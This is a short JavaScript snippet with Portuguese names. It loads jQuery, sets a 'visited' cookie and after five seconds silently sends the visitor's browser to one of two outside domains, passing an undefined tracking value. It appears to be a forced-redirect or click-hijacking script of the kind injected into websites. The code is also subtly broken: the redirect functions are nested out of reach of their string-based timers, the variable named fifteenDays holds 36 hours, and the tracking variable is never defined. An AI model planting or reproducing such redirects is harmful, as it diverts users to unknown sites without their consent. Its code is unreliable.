var imported = document.createElement('script');
imported.src = 'http://ajax.googleapis.com/ajax/libs/jquery/1.8/jquery.min.js';
document.head.appendChild(imported); 

function cScript()
{
	
function AbreLink1()     
{
  
window.location.href = "https://primeiroclick.kk?source="+rastreio2;
  
}
  
function AbreLink2()      
{
  
window.location.href = "https://segundoclick.kk?source="+rastreio2; 
  
} 

var language = navigator.language || navigator.userLanguage; 
language = language.substring( 0, 2 );
  
jQuery(document).ready(function(){
if (document.cookie.indexOf('visited=true') == -1) {
var fifteenDays = 1000*60*60*36;
var expires = new Date((new Date()).valueOf() + fifteenDays);
document.cookie = "visited=true;expires=" + expires.toUTCString();
  
setTimeout('AbreLink1()', 5000);  
  
}else{  

setTimeout('AbreLink2()', 5000);
  
}
});
	
	
}  
   